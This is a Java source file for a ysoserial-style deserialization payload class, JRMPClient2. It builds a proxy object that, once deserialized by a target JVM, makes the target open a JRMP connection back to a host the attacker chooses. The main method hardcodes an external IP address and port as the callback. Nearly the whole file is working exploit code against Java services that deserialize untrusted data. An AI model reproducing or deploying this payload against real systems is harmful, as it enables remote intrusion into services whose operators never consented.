package ysoserial.payloads;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

@SuppressWarnings({
    "restriction"
})
@PayloadTest(harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
@Authors({Authors.JAYL1n})
public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activator> {

    public Activator getObject(final String command) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[]{
            Activator.class
        }, obj);
        return proxy;
    }


    public static void main(final String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
//        PayloadRunner.run(JRMPClient2.class, args);
        PayloadRunner.run(JRMPClient2.class, new String[]{"118.24.115.224:1099"});
    }
}
